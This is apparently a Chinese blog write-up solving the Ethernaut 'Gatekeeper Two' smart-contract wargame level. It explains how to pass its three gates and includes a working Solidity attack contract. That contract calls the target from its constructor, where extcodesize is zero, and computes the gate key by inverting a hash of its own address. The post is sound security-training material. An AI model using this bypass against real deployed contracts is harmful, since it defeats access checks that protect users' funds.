---
title: Ethernaut - Gatekeeper Two
categories: [Ethernaut]
tags: [以太坊, 智能合约, Ethernaut]
date: 2024-12-23
---

第二题，差不多，就是有个汇编代码关键字。

<!--more-->

```solidity
assembly {
    x := extcodesize(caller())
}
```

- extcodesize(address)是用于返回地址的字节码长度
    - 如果是合约，字节码长度非零
    - 如果是账户，字节码长度为零

- caller() 就是 msg.sender；



这就有点奇怪了啊？

```Solidity
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
}

modifier gateTwo() {
    uint256 x;
    assembly {
        x := extcodesize(caller())
    }
    require(x == 0);
    _;
}

modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
}
```

既要发送者是账户，又要经过合约转发？



绕过gateTwo的方法是，合约在创建阶段，字节码长度还是0；所以在构造函数里调用就可以了。

第三问一个简单的位运算。

```solidity
contract Attack {
    constructor(address _target) {
        GatekeeperTwo gk = GatekeeperTwo(_target);

        bytes8 key = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        gk.enter(key);
    }
}
```



